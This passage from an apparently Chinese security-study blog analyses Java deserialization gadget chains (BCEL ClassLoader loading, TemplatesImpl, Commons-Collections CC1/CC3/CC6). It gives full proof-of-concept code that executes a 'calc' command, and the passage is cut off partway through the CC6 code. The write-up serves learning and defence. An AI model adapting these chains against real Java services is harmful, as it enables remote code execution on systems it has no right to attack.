class="hljs-number">871</span>$e3$c7$5dL$f8$c8a$d2$c5$<span class="hljs-number">94</span>$8bi$<span class="hljs-number">86</span>$fc$<span class="hljs-number">86</span>$8a$<span class="hljs-number">95</span>$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$<span class="hljs-number">87</span>$<span class="hljs-number">89</span>$e0$d1$vO$<span class="hljs-number">95</span>$<span class="hljs-number">89</span>$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$<span class="hljs-number">5d</span>$r$f5$dd$c3$ed$5b$n$dbZ$r1$<span class="hljs-number">95</span>$V$h$9a$8b$ab$<span class="hljs-number">7d</span>$de$b6$Y$da$<span class="hljs-number">88</span>$c1o$q$ddT$c8$je$b0$F$<span class="hljs-number">83</span>$5b5$bd$B$K$f0$<span class="hljs-number">5d</span>$cc$E$<span class="hljs-number">98</span>$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$<span class="hljs-number">7d</span>$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$<span class="hljs-number">89</span>$<span class="hljs-number">90</span>$<span class="hljs-number">9d</span>$O5$<span class="hljs-number">94</span>$da$<span class="hljs-number">94</span>$d4$f6$d0$<span class="hljs-number">93</span>$<span class="hljs-number">94</span>$LI$H$b8$f43$cc$<span class="hljs-number">93</span>$B3g$<span class="hljs-number">91</span>$ed$a1$a8N$9e$<span class="hljs-number">91</span>$cf$ad$3c$<span class="hljs-number">82</span>$dd$dbt$406o$c5$y$8ad$<span class="hljs-number">83</span>$<span class="hljs-number">8f</span>$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$<span class="hljs-number">86</span>$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$<span class="hljs-number">99</span>$a2$Bz$5ddB$X$<span class="hljs-number">83</span>$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A<br></code></pre></td></tr></table></figure><blockquote><p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p><p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELRCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706693.png"></p><h1 id="CC3-链分析"><a href="#CC3-链分析" class="headerlink" title="CC3 链分析"></a>CC3 链分析</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>JDK ：8u65</p><p><font style="color:#080808;background-color:#ffffff;">commons-collections 3.2.1</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="分析链"><a href="#分析链" class="headerlink" title="分析链"></a>分析链</h2><p>CC3 利用的就是上文分析的 ”利用 TemplatesImpl 加载字节码“这条链，然后结合 CC1&#x2F;CC6 的前半部分形成可用 POC。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706437.png"></p><h3 id="TemplatesImpl-链："><a href="#TemplatesImpl-链：" class="headerlink" title="TemplatesImpl 链："></a>TemplatesImpl 链：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC1-CC3-（InvokerTransformer）"><a href="#CC1-CC3-（InvokerTransformer）" class="headerlink" title="CC1 + CC3 （InvokerTransformer）"></a>CC1 + CC3 （<strong><font style="color:rgb(44, 62, 80);">InvokerTransformer）</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706301.png"></p><h4 id="CC1："><a href="#CC1：" class="headerlink" title="CC1："></a>CC1：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>结合一下啊：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706042.png"></p><h4 id="CC6："><a href="#CC6：" class="headerlink" title="CC6："></a>CC6：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 